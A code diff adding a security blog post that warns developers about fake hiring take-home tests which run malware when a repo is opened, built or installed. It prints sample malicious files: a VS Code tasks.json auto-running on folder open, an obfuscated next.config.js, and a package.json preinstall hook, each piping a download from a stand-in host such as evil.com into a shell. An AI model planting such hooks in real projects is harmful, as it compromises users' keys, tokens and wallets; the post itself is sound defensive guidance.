@@ -16,6 +16,422 @@ export type BlogPost = {
 
 export const posts: BlogPost[] = [
   {
+    slug: "hiring-scams-remote-code-execution",
+    title: "Hiring Scams: How Fake Job Tests Deploy Malware",
+    date: "2026-01-24",
+    tags: ["security", "malware", "scams", "vscode", "careers"],
+    summary:
+      "A quick guide to spotting malicious 'take-home tests' that auto-execute code when you open them. Protect your machine, SSH keys, and wallet.",
+    category: "Security",
+    readTime: "5 min read",
+    image: "/images/hiring.webp",
+    body: () => {
+      return (
+        <>
+          <p className="mb-6 text-lg text-muted-foreground">
+            You get a take-home coding challenge from a recruiter. You clone the
+            repo, open it in VS Code, and—without clicking anything—malware
+            runs. Your SSH keys, browser sessions, and crypto wallets are now at
+            risk. Here&apos;s how to spot it.
+          </p>
+
+          <div className="relative mb-8 h-[320px] w-[85vw] lg:w-[700px] mx-auto overflow-hidden rounded-2xl border border-dashed border-border/60 bg-card/60">
+            <Image
+              src={"/images/hiring.webp"}
+              className="object-cover object-center"
+              alt="Malicious VS Code tasks configuration"
+              fill
+              priority
+            />
+          </div>
+
+          <div className="mb-8 rounded-2xl border border-red-500/30 bg-red-500/10 p-4 text-sm">
+            <div className="text-xs uppercase tracking-[0.22em] text-red-400 mb-2">
+              🚨 CRITICAL WARNING
+            </div>
+            <ul className="list-disc space-y-2 pl-5 text-muted-foreground">
+              <li>
+                <strong>Never run code from unknown sources</strong> - even
+                &quot;legitimate-looking&quot; job tests
+              </li>
+              <li>
+                <strong>
+                  Check .vscode/, next.config.js, and package.json
+                </strong>{" "}
+                before opening projects
+              </li>
+              <li>
+                <strong>Pipe-to-shell execution is a major red flag:</strong>{" "}
+                <code>curl URL | sh</code>
+              </li>
+              <li>
+                If something auto-runs on folder open,{" "}
+                <strong>disconnect immediately</strong>
+              </li>
+            </ul>
+          </div>
+
+          <h2 className="mt-0 text-2xl font-bold text-primary">
+            Pattern #1: Malicious .vscode/tasks.json
+          </h2>
+          <p className="mt-3 leading-relaxed text-muted-foreground">
+            VS Code allows tasks to run automatically when you open a folder.
+            Attackers hide malware execution here because most developers
+            don&apos;t check hidden folders.
+          </p>
+
+          <CodeBlock
+            language="json"
+            title="🚩 RED FLAG: Auto-execution on folder open"
+            code={`{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "type": "shell",
+      "linux": {
+        "command": "wget -qO- 'https://fake-tailwind.vercel.app/payload' | sh"
+      },
+      "osx": {
+        "command": "curl 'https://fake-tailwind.vercel.app/payload' | sh"
+      },
+      "windows": {
+        "command": "curl \\"https://fake-tailwind.vercel.app/payload\\" | cmd"
+      },
+      "presentation": {
+        "reveal": "never",    // ← Hide terminal output
+        "echo": false,        // ← Silent execution
+        "close": true         // ← Close immediately
+      },
+      "runOptions": {
+        "runOn": "folderOpen" // ← Runs automatically!
+      }
+    }
+  ]
+}`}
+          />
+
+          <div className="mt-4 p-4 bg-muted/30 rounded-lg border border-border">
+            <p className="font-semibold text-foreground">
+              Why this is malicious:
+            </p>
+            <ul className="mt-2 list-disc space-y-1 pl-6 text-muted-foreground text-sm">
+              <li>
+                <strong>Auto-executes on folder open</strong> - you don&apos;t
+                click anything
+              </li>
+              <li>
+                <strong>Pipe-to-shell pattern</strong> - downloads and runs
+                remote code instantly
+              </li>
+              <li>
+                <strong>Hidden execution</strong> - terminal never shows, closes
+                immediately
+              </li>
+              <li>
+                <strong>Fake domain</strong> - impersonates trusted tools like
+                Tailwind
+              </li>
+              <li>
+                <strong>No verification</strong> - no checksums, no signatures,
+                no transparency
+              </li>
+            </ul>
+          </div>
+
+          <h2 className="mt-10 text-2xl font-bold text-primary">
+            Pattern #2: Obfuscated next.config.js
+          </h2>
+          <p className="mt-3 leading-relaxed text-muted-foreground">
+            Next.js config files run during build and dev server startup.
+            Scammers hide malicious code here using obfuscation or encoded
+            strings.
+          </p>
+
+          <CodeBlock
+            language="javascript"
+            title="🚩 RED FLAG: Obfuscated config code"
+            code={`// next.config.js
+const _0x4a2b=['exec','child_process','https://evil.com/payload.sh'];
+(function(_0x123,_0x456){const _0x789=function(_0xabc){
+  while(--_0xabc){_0x123['push'](_0x123['shift']());}};
+  _0x789(++_0x456);
+}(_0x4a2b,0x123));
+
+const config = {
+  webpack: (config) => {
+    require(_0x4a2b[1])[_0x4a2b[0]](\`curl \${_0x4a2b[2]} | sh\`);
+    return config;
+  }
+};
+
+module.exports = config;`}
+          />
+
+          <div className="mt-4 p-4 bg-muted/30 rounded-lg border border-border">
+            <p className="font-semibold text-foreground">
+              Why this is malicious:
+            </p>
+            <ul className="mt-2 list-disc space-y-1 pl-6 text-muted-foreground text-sm">
+              <li>
+                <strong>Unreadable code</strong> - legitimate configs are clean
+                and documented
+              </li>
+              <li>
+                <strong>Hex-encoded strings</strong> - hiding real URLs and
+                commands
+              </li>
+              <li>
+                <strong>child_process.exec()</strong> - running shell commands
+                during build
+              </li>
+              <li>
+                <strong>Executes on npm run dev or npm run build</strong>
+              </li>
+            </ul>
+          </div>
+
+          <CodeBlock
+            language="javascript"
+            title="✅ What legitimate next.config.js looks like"
+            code={`// next.config.js
+/** @type {import('next').NextConfig} */
+const nextConfig = {
+  reactStrictMode: true,
+  images: {
+    domains: ['example.com'],
+  },
+  env: {
+    API_URL: process.env.API_URL,
+  },
+};
+
+module.exports = nextConfig;`}
+          />
+
+          <h2 className="mt-10 text-2xl font-bold text-primary">
+            Pattern #3: Suspicious package.json dependencies
+          </h2>
+          <p className="mt-3 leading-relaxed text-muted-foreground">
+            Malicious packages can execute code during <code>npm install</code>{" "}
+            via install scripts or hidden dependencies.
+          </p>
+
+          <CodeBlock
+            language="json"
+            title="🚩 RED FLAG: Dangerous install scripts"
+            code={`{
+  "name": "hiring-test",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node scripts/setup.js",
+    "preinstall": "curl https://malicious-cdn.com/init.sh | bash"
+  },
+  "dependencies": {
+    "react": "^18.2.0",
+    "next": "^14.0.0",
+    "@evil-org/helper-utils": "^1.0.0"  // ← typosquatting
+  }
+}`}
+          />
+
+          <div className="mt-4 p-4 bg-muted/30 rounded-lg border border-border">
+            <p className="font-semibold text-foreground">
+              Red flags in package.json:
+            </p>
+            <ul className="mt-2 list-disc space-y-1 pl-6 text-muted-foreground text-sm">
+              <li>
+                <strong>postinstall/preinstall scripts</strong> - run
+                automatically during npm install
+              </li>
+              <li>
+                <strong>Typosquatted packages</strong> - &quot;react-domm&quot;
+                instead of &quot;react-dom&quot;
+              </li>
+              <li>
+                <strong>Unknown scoped packages</strong> - @random-org/utils
+                from non-verified publishers
+              </li>
+              <li>
+                <strong>Very low download counts</strong> - check npm stats
+                before installing
+              </li>
+              <li>
+                <strong>Recently published packages</strong> - with no commit
+                history or community
+              </li>
+            </ul>
+          </div>
+
+          <h2 className="mt-10 text-2xl font-bold text-primary">
+            What to do BEFORE opening any repo
+          </h2>
+
+          <div className="mt-4 grid gap-3 rounded-xl border border-border/60 bg-card/60 p-4 text-sm text-muted-foreground">
+            <div className="text-xs uppercase tracking-[0.22em] text-primary/70">
+              Pre-flight checklist (30 seconds)
+            </div>
+            <ol className="list-decimal space-y-2 pl-5">
+              <li>
+                <strong>Check .vscode/tasks.json first</strong> - look for
+                &quot;runOn&quot;: &quot;folderOpen&quot;
+              </li>
+              <li>
+                <strong>Scan with agents</strong> - if already cloned and no
+                .vscode folder, scan with tools like cursor or copilot kits
+                agents mode to verify safety.
+              </li>
+              <li>
+                <strong>Read next.config.js</strong> - should be clean, no
+                obfuscation
+              </li>
+              <li>
+                <strong>Inspect package.json scripts</strong> - no
+                preinstall/postinstall with curl/wget
+              </li>
+              <li>
+                <strong>Verify all dependencies</strong> - search each on
+                npmjs.com, check weekly downloads
+              </li>
+              <li>
+                <strong>Never run npm install blindly</strong> - review first,
+                install with --ignore-scripts if needed
+              </li>
+            </ol>
+          </div>
+
+          <h2 className="mt-10 text-2xl font-bold text-primary">
+            If you already opened a suspicious repo
+          </h2>
+
+          <div className="mt-4 p-4 bg-red-500/10 rounded-lg border border-red-500/30">
+            <p className="font-semibold text-foreground mb-3">
+              Immediate actions:
+            </p>
+            <ol className="list-decimal space-y-2 pl-5 text-muted-foreground text-sm">
+              <li>
+                <strong>Disconnect from the internet</strong> immediately
+              </li>
+              <li>
+                <strong>Kill VS Code and all terminals</strong>
+              </li>
+              <li>
+                <strong>Check running processes</strong> for unknown executables
+              </li>
+              <li>
+                <strong>Rotate credentials immediately:</strong>
+                <ul className="list-disc pl-6 mt-1 space-y-1">
+                  <li>SSH keys (~/.ssh/)</li>
+                  <li>GitHub personal access tokens</li>
+                  <li>Browser sessions (logout everywhere)</li>
+                  <li>API keys in .env files</li>
+                </ul>
+              </li>
+              <li>
+                <strong>Move crypto wallets to new addresses</strong> if any
+                were on that machine
+              </li>
+              <li>
+                <strong>Consider full OS reinstall</strong> if you had sensitive
+                data
+              </li>
+            </ol>
+          </div>
+
+          <h2 className="mt-10 text-2xl font-bold text-primary">
+            Real-world impact
+          </h2>
+
+          <div className="mt-4 space-y-3 text-muted-foreground">
+            <p>Developers have lost:</p>
+            <ul className="list-disc space-y-1 pl-6">
+              <li>
+                <strong>Crypto wallets</strong> - MetaMask, hardware wallet
+                seeds from browser extensions
+              </li>
+              <li>
+                <strong>GitHub accounts</strong> - compromised via stolen
+                tokens, used for supply chain attacks
+              </li>
+              <li>
+                <strong>Cloud credentials</strong> - AWS keys in .env files,
+                leading to massive bills
+              </li>
+              <li>
+                <strong>Client data</strong> - SSH keys used to access
+                production servers
+              </li>
+            </ul>
+            <p className="mt-3">
+              Even experienced senior engineers have fallen for these because
+              they <em>look</em> legitimate and target high-trust contexts (job
+              applications).
+            </p>
+          </div>
+
+          <h2 className="mt-10 text-2xl font-bold text-primary">
+            Summary: Trust your instincts
+          </h2>
+
+          <div className="mt-4 p-4 bg-primary/10 rounded-lg border-2 border-primary/30">
+            <p className="font-semibold text-foreground mb-2">
+              If something feels off, it probably is:
+            </p>
+            <ul className="space-y-1 text-muted-foreground text-sm">
+              <li>✅ Legitimate companies don&apos;t hide code in .vscode/</li>
+              <li>
+                ✅ Real hiring tests don&apos;t auto-execute on folder open
+              </li>
+              <li>✅ Professional repos have clean, documented configs</li>
+              <li>✅ Your security instincts are valuable—listen to them</li>
+            </ul>
+          </div>
+
+          <div className="mt-8 rounded-2xl border border-border/60 bg-card/60 p-5 text-sm text-muted-foreground">
+            <div className="text-xs uppercase tracking-[0.22em] text-primary/70">
+              Resources
+            </div>
+            <ul className="mt-2 space-y-2">
+              <li>
+                •{" "}
+                <a
+                  href="https://code.visualstudio.com/docs/editor/tasks#_can-a-task-run-automatically"
+                  className="text-primary hover:underline"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  VS Code Task Security
+                </a>
+              </li>
+              <li>
+                •{" "}
+                <a
+                  href="https://socket.dev/"
+                  className="text-primary hover:underline"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  Socket.dev - npm security scanner
+                </a>
+              </li>
+              <li>
+                •{" "}
+                <a
+                  href="https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability"
+                  className="text-primary hover:underline"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                >
+                  npm install script security
+                </a>
+              </li>
+            </ul>
+          </div>
+        </>
+      );
+    },
+  },
+  {
     slug: "trading-uis-for-beginners",
     title: "Trading UI's for Beginners",
     date: "2026-01-11",
